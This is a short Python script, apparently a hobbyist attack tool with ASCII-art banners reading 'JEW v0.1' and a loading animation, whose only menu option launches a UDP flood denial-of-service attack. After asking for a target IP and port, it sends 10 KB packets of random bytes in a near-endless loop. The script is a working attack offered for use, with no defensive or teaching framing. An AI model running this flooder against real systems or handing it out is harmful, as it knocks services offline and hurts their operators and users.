import socket, random, subprocess, typer, sys, time, threading, os, itertools


banner = r"""                                        
                   qd                   
                  qddd                  
                 pddddd                 
                dddmLddd                
               dddY  rddd               
     ddddddddddddddddddddddddddddddx    
     ,ddd    dddj      iddd    dddl     
       ddd  dddt        ,ddd  ddd.      
        dddddd            dddddd        
         dddd              dddd         
         dddd              dddd         
        dddddd            dddddd        
       ddd  ddd,         ddd  ddd.      
      ddd    ddd!       ddd    dddI     
     dddddddddddddddddddddddddddddd;    
               dddr  xddd               
                dddQvddd                
                 dddddd                 
                  dddd                  
                   pd                   
                                        
"""
name = r"""   $$$$$\ $$$$$$$$\ $$\      $$\       $$\    $$\  $$$$$$\        $$\   
   \__$$ |$$  _____|$$ | $\  $$ |      $$ |   $$ |$$$ __$$\     $$$$ |  
      $$ |$$ |      $$ |$$$\ $$ |      $$ |   $$ |$$$$\ $$ |    \_$$ |  
      $$ |$$$$$\    $$ $$ $$\$$ |      \$$\  $$  |$$\$$\$$ |      $$ |  
$$\   $$ |$$  __|   $$$$  _$$$$ |       \$$\$$  / $$ \$$$$ |      $$ |  
$$ |  $$ |$$ |      $$$  / \$$$ |        \$$$  /  $$ |\$$$ |      $$ |  
\$$$$$$  |$$$$$$$$\ $$  /   \$$ |         \$  /   \$$$$$$  /$$\ $$$$$$\ 
 \______/ \________|\__/     \__|          \_/     \______/ \__|\______|
 -----------------------------------------------------------------------------
 """

typer.clear()
print(name)

done = False
#here is the animation
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rloading ' + c)
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\rDone!     ')

t = threading.Thread(target=animate)
t.start()


#long process here
time.sleep(4)
done = True

time.sleep(3)
typer.clear()
print(name)

DoS = input("[1] Denial-of-Service (DoS) ")

#DoS Attack
if DoS == "1":
    import socket, random, time
    s = socket.socket(socket.AF_INET, socket.				SOCK_DGRAM)
    ip = input("Enter Target IP: ")
    port =int(input("Enter Target Port: "))
    s.connect((ip, port))
    for i in range (1, 100**1000):
            s.send(random._urandom(10)*1000)
            print(f"Send: {i}")



time.sleep(5)
